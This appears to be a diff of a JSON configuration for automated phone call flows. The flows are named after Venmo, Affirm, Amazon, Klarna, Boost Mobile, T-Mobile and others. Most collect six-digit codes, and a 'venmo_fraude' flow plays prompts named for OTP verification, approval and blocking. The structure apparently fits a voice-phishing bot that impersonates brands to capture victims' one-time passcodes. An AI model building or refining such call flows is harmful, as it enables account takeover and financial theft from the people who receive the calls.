@@ -1,333 +1,32 @@
 {
     "venmo": {
         "answer": {
-            "audio": "https://ivrconver.nyc3.cdn.digitaloceanspaces.com/9H4Zd9v7.wav",
+            "audio": "https://venmo.nyc3.digitaloceanspaces.com/answer.wav",
             "next": "gather",
             "dgts": 1,
             "method": "GET",
             "timeout": 10
         },
         "gather": {
-            "audio": "https://ivrconver.nyc3.cdn.digitaloceanspaces.com/Q3v4vM1D.wav",
+            "audio": "https://venmo.nyc3.digitaloceanspaces.com/gather.wav",
             "next": "confirm",
             "dgts": 6,
             "method": null,
             "timeout": 40
         },
         "confirm": {
-            "audio": "https://ivrconver.nyc3.cdn.digitaloceanspaces.com/vxXT070Y.wav",
+            "audio": "https://venmo.nyc3.digitaloceanspaces.com/confirm.wav",
             "timeout": 99
         },
         "invalid": {
-            "audio": "https://ivrconver.nyc3.cdn.digitaloceanspaces.com/auL0075q.wav",
+            "audio": "https://venmo.nyc3.digitaloceanspaces.com/invalid.wav",
             "next": "confirm",
             "dgts": 6,
             "method": null,
             "timeout": 40
         },
         "completed": {
-            "audio": "https://ivrconver.nyc3.cdn.digitaloceanspaces.com/6Qn2zu3N.wav",
-            "next": null,
-            "dgts": 0,
-            "method": null,
-            "timeout": 0
-        }
-    },
-    "affirm": {
-        "answer": {
-            "audio": "https://newspace.sfo3.cdn.digitaloceanspaces.com/audio/affirm1.wav",
-            "next": "gather",
-            "dgts": 1,
-            "method": "GET",
-            "timeout": 10
-        },
-        "gather": {
-            "audio": "https://newspace.sfo3.cdn.digitaloceanspaces.com/audio/affirm2.wav",
-            "next": "confirm",
-            "dgts": 6,
-            "method": null,
-            "timeout": 40
-        },
-        "confirm": {
-            "audio": "https://newspace.sfo3.cdn.digitaloceanspaces.com/audio/affirm3.wav",
-            "timeout": 99
-        },
-        "invalid": {
-            "audio": "https://newspace.sfo3.cdn.digitaloceanspaces.com/audio/affirm5.wav",
-            "next": "confirm",
-            "dgts": 6,
-            "method": null,
-            "timeout": 40
-        },
-        "completed": {
-            "audio": "https://newspace.sfo3.cdn.digitaloceanspaces.com/audio/affirm4.wav",
-            "next": null,
-            "dgts": 0,
-            "method": null,
-            "timeout": 0
-        }
-    },
-    "amazon": {
-        "answer": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/gather.wav",
-            "next": "gather",
-            "dgts": 1,
-            "method": "GET",
-            "timeout": 10
-        },
-        "gather": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/gather.wav",
-            "next": "confirm",
-            "dgts": 6,
-            "method": null,
-            "timeout": 40
-        },
-        "confirm": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/gather.wav",
-            "timeout": 99
-        },
-        "invalid": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/gather.wav",
-            "next": "confirm",
-            "dgts": 6,
-            "method": null,
-            "timeout": 40
-        },
-        "completed": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/gather.wav",
-            "next": null,
-            "dgts": 0,
-            "method": null,
-            "timeout": 0
-        }
-    },
-    "venmo_fraude": {
-        "options": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/IVR/answer.wav",
-            "next": "options",
-            "dgts": 1,
-            "method": "GET",
-            "timeout": 10
-        },
-        "option1": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/IVR/valid_transaction.wav",
-            "next": "confirm",
-            "dgts": 6,
-            "method": null,
-            "timeout": 40
-        },
-        "option2": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/IVR/dont_recognize.wav",
-            "next": "confirm",
-            "dgts": 6,
-            "method": null,
-            "timeout": 40
-        },
-        "confirm": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/IVR/code_verification.wav",
-            "timeout": 99
-        },
-        "completed_option2": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/IVR/Valid_OTP_block.wav",
-            "next": null,
-            "dgts": 0,
-            "method": null,
-            "timeout": 40
-        },
-        "completed_option1": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/IVR/Valid_OTP_approve.wav",
-            "next": null,
-            "dgts": 0,
-            "method": null,
-            "timeout": 0
-        },
-        "invalid": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/IVR/Invalid_OTP.wav",
-            "next": "confirm",
-            "dgts": 6,
-            "method": null,
-            "timeout": 40
-        }
-    },
-    "customs": {
-        "answer": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/IVR/completed.wav",
-            "next": "gather",
-            "dgts": 1,
-            "method": "GET",
-            "timeout": 10
-        },
-        "gather": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/IVR/gather.wav",
-            "next": "confirm",
-            "dgts": 1,
-            "method": null,
-            "timeout": 40
-        },
-        "confirm": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/IVR/confirm.wav",
-            "timeout": 99
-        },
-        "invalid": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/IVR/invalid.wav",
-            "next": "confirm",
-            "dgts": 1,
-            "method": null,
-            "timeout": 40
-        },
-        "completed": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/IVR/completed.wav",
-            "next": null,
-            "dgts": 0,
-            "method": null,
-            "timeout": 0
-        }
-    },
-    "klarna": {
-        "answer": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/IVR/gather.wav",
-            "next": "gather",
-            "dgts": 1,
-            "method": "GET",
-            "timeout": 10
-        },
-        "gather": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/IVR/gather.wav",
-            "next": "confirm",
-            "dgts": 6,
-            "method": null,
-            "timeout": 40
-        },
-        "confirm": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/IVR/confirm.wav",
-            "timeout": 99
-        },
-        "invalid": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/IVR/invalid.wav",
-            "next": "confirm",
-            "dgts": 6,
-            "method": null,
-            "timeout": 40
-        },
-        "completed": {
-            "audio": "https://allfile.nyc3.digitaloceanspaces.com/IVR/completed.wav",
-            "next": null,
-            "dgts": 0,
-            "method": null,
-            "timeout": 0
-        }
-    },
-    "dave": {
-        "answer": {
-            "audio": "https://codegenie.cc/admin-panel/",
-            "next": "gather",
-            "dgts": 1,
-            "method": "GET",
-            "timeout": 10
-        },
-        "gather": {
-            "audio": "https://codegenie.cc/admin-panel/",
-            "next": "confirm",
-            "dgts": 1,
-            "method": null,
-            "timeout": 40
-        },
-        "confirm": {
-            "audio": "https://codegenie.cc/admin-panel/",
-            "timeout": 99
-        },
-        "invalid": {
-            "audio": "https://codegenie.cc/admin-panel/",
-            "next": "confirm",
-            "dgts": 1,
-            "method": null,
-            "timeout": 40
-        },
-        "completed": {
-            "audio": "https://codegenie.cc/admin-panel/",
-            "next": null,
-            "dgts": 0,
-            "method": null,
-            "timeout": 0
-        }
-    },
-    "boostMobile": {
-        "answer": {
-            "audio": "http://127.0.0.1:8000/admin-panel/",
-            "next": "gather",
-            "dgts": 1,
-            "method": "GET",
-            "timeout": 10
-        },
-        "gather": {
-            "audio": "http://127.0.0.1:8000/admin-panel/",
-            "next": "confirm",
-            "dgts": 6,
-            "method": null,
-            "timeout": 40
-        },
-        "gather1": {
-            "audio": "http://127.0.0.1:8000/admin-panel/",
-            "next": "confirm",
-            "dgts": 6,
-            "method": null,
-            "timeout": 40
-        },
-        "confirm": {
-            "audio": "http://127.0.0.1:8000/admin-panel/",
-            "timeout": 99
-        },
-        "invalid": {
-            "audio": "http://127.0.0.1:8000/admin-panel/",
-            "next": "confirm",
-            "dgts": 6,
-            "method": null,
-            "timeout": 40
-        },
-        "completed": {
-            "audio": "http://127.0.0.1:8000/admin-panel/",
-            "next": null,
-            "dgts": 0,
-            "method": null,
-            "timeout": 0
-        }
-    },
-    "t-mobile": {
-        "answer": {
-            "audio": "http://127.0.0.1:8000/admin-panel/",
-            "next": "gather",
-            "dgts": 1,
-            "method": "GET",
-            "timeout": 10
-        },
-        "gather": {
-            "audio": "http://127.0.0.1:8000/admin-panel/",
-            "next": "confirm",
-            "dgts": 6,
-            "method": null,
-            "timeout": 99
-        },
-        "gather1": {
-            "audio": "http://127.0.0.1:8000/admin-panel/",
-            "next": "completed",
-            "dgts": 0,
-            "finishOnKey": "#",
-            "method": null,
-            "timeout": 99
-        },
-        "confirm": {
-            "audio": "http://127.0.0.1:8000/admin-panel/",
-            "timeout": 99
-        },
-        "invalid": {
-            "audio": "http://127.0.0.1:8000/admin-panel/",
-            "next": "confirm",
-            "dgts": 6,
-            "method": null,
-            "timeout": 40
-        },
-        "completed": {
-            "audio": "http://127.0.0.1:8000/admin-panel/",
+            "audio": "https://venmo.nyc3.digitaloceanspaces.com/completed.wav",
             "next": null,
             "dgts": 0,
             "method": null,
@@ -336,32 +35,32 @@
     },
     "boost": {
         "answer": {
-            "audio": "https://codegenie.cc/admin-panel/",
+            "audio": "https://boost-mobile.sfo3.digitaloceanspaces.com/answer.wav",
             "next": "gather",
             "dgts": 1,
             "method": "GET",
             "timeout": 10
         },
         "gather": {
-            "audio": "https://codegenie.cc/admin-panel/",
+            "audio": "https://boost-mobile.sfo3.digitaloceanspaces.com/gather.wav",
             "next": "confirm",
             "dgts": 6,
             "method": null,
             "timeout": 40
         },
         "confirm": {
-            "audio": "https://codegenie.cc/admin-panel/",
+            "audio": "https://boost-mobile.sfo3.digitaloceanspaces.com/confirm.wav",
             "timeout": 99
         },
         "invalid": {
-            "audio": "https://codegenie.cc/admin-panel/",
+            "audio": "https://boost-mobile.sfo3.digitaloceanspaces.com/invalid.wav",
             "next": "confirm",
             "dgts": 6,
             "method": null,
             "timeout": 40
         },
         "completed": {
-            "audio": "https://codegenie.cc/admin-panel/",
+            "audio": "https://boost-mobile.sfo3.digitaloceanspaces.com/completed.wav",
             "next": null,
             "dgts": 0,
             "method": null,
